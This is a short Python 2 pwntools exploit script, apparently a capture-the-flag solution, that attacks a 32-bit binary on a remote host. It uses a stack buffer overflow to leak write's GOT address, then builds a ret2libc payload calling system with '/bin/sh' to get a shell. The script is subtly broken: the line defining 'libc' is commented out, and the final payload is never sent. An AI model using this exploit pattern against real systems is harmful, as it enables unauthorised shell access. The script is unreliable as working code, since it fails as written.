#! /usr/bin/python 
from pwn import *
from LibcSearcher import *

WRITE_LIBC_ADDR = 0x000d43c0

#sh = process('./vul32')
sh = remote('202.112.51.154', 20001)
elf = ELF('./vul32')

dovuln_addr = elf.symbols['dovuln']
write_addr = elf.plt['write']
print elf.got
write_got = elf.got['write']

print "dovuln:", dovuln_addr 
print "write:", write_addr 
print "write_got:", write_got 

payload = flat([    \
    'G' * 52,       \
    write_addr,     \
    dovuln_addr,    \
    1,              \
    write_got,     \
    4               \
    ])

sh.sendlineafter('Plz input something:', payload)

write_addr = u32(sh.recv()[0:4])
print "write_addr:", write_addr 

#libc = LibcSearcher('write', write_addr)
#libc.add_condition('write', write_addr)
libcbase = write_addr - WRITE_LIBC_ADDR 
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print "hacking"
payload = flat([    \
    'G'* 52,        \
    system_addr,    \
    0xabbabaab,     \
    binsh_addr      
    ])

print "now pwn"
sh.interactive()

